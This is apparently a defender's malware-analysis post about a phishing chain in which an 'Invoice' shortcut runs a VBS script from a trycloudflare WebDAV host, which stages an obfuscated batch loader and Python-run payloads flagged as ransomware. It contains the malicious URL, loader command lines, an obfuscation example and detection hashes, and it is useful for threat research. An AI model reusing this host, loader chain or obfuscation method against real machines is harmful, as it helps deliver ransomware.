Hey Together!

Today we got an interesting zip file containing only a `.lnk` file named "Invoice" that triggered the WScript host with the path `\ni-olympic-forests-invoice.trycloudflare.com@SSL\DavWWWRoot\tat.vbs` to execute.
Sadly, we don't have the original file anymore. We use disposable VMs as workstations that get deleted in such cases.

I have sent as many files as I could get to ensure you can take a deep dive into it. Sadly, I did not get deeper into the Python `load.py` and the binaries that do all the final magic.

_TLDR_  
This runs a VBS script triggering a batch script, which then plants a portable Python 3.12 and some binary files with `load.py` to seemingly encrypt files and request BTC to decrypt them.  
Big questions were raised by this:

- Why is it allowed to run a CMD -C from a URL?
- How can WScript be triggered from a WebDAV?
- What does `load.py` do with the other binaries?

_Longer explanation:_  
When opening the path in the editor, we can see the contents!

The VBS spawns a new CMD with the -C option to a HTTPS path (why the heck should this be allowed?) to stage its loader (`voi.bat`).

This is heavily obfuscated, but with some smart ideas from ChatGPT to replace all variables (`%.*%`) with `[VAR]`, I found out it's just noise added to it.

Example:

```
@[VAR]e[VAR]c[VAR]h[VAR]o[VAR] [VAR]o[VAR]f[VAR]f[VAR]
s[VAR]e[VAR]t[VAR]l[VAR]o[VAR]c[VAR]a[VAR]l[VAR]
```

Converts to

```
@echo off
setlocal
```

Because the vars do not resolve to anything, it's nothing more than noise added to the script!

With that, I searched for all the variables that are needed in the script to download and save stuff, telling ChatGPT, "Please remove all except these!"

```
antivirusDetected
runCommand1
runCommand2
runCommand3
runCommand4
zipUrl
retires
zipUrl
destination
ERRORLEVEL
txtUrl
txtDestination
```

Out came my final deobfuscated `voi.bat`, going deeper into the rabbit hole.

In our case, the "antivirusDetected" wasn't triggered, and because of this, I got my hands on the `bab.zip` file, which contained a portable Python + `load.py` and some bin files.

Because of the deobfuscated `voi.bat`, I knew the following commands would get triggered:

```
set "runCommand1=load.py cc.bin"
set "runCommand2=load.py vv.bin"
set "runCommand3=load.py pay.bin"
set "runCommand4=load.py payload.bin"
...
"\python.exe" %runCommand1%
...
"\python.exe" %runCommand2%
...
"\python.exe" %runCommand3%
...
"\python.exe" %runCommand4%
```

I tried some more and fed these back to ChatGPT, but sadly, didn't get much further...

All it found was that the `cc.bin` contained the function "delete" and `pay.bin` contains "btc" somewhere.

# Now it's your turn :D

I would love to see you get deeper into it!

All payload files are attached in the encrypted `.7z` (password: "plzsubscribe"), including my deobfuscated file from ChatGPT.  
I added a screenshot of our XDR and why it got remediated and killed (Thread Indicators) as well.  
Without its help, we probably would have run into a ransomware attack!

# Sentinel One Output

```
Threat Info:
Name: wscript.exe (CLI 1242)
URL: _redacted_
Path: \Device\HarddiskVolume3\Windows\System32\wscript.exe (CLI 1242)
Command Line Arguments: "\\ni-olympic-forests-invoice.trycloudflare.com@SSL\DavWWWRoot\tat.vbs"
Process User: _redacted_
Signature Verification: NotSigned
Originating Process: explorer.exe
SHA1: 12427b31dfda0fd6d07cd2792eab5863c8da0a0d
SHA256: b6359dcb4e55310ff3471ee180141cad9333b51e03c2da8c57afb55969be0047
MD5: 3c979f9b452df16a1e2d7b1d56b39902
Initiated By: Agent Policy
Engine: Anti Exploitation / Fileless
Detection type: Dynamic
Classification: Ransomware
Storyline: 8D95C5F34630CCAB
Threat Id: 2086152210643011641
Endpoint Info:
Computer Name: _redacted_
Console Connectivity: Offline
Full Disk Scan: Completed at Nov 15, 2024 13:13:32
Pending reboot: No
Network Status: Disconnected
Scope: \*_redacted_
OS Version: Windows 10 Enterprise LTSC 19044
Agent Version: 24.1.4.257
Policy: protect
UUID: _redacted_
Domain: _redacted_
IP v4 Address: _redacted_
IP v6 Address: _redacted_
Console Visible IP Address: _redacted_
Subscription Time: Nov 15, 2024 13:13:32
```
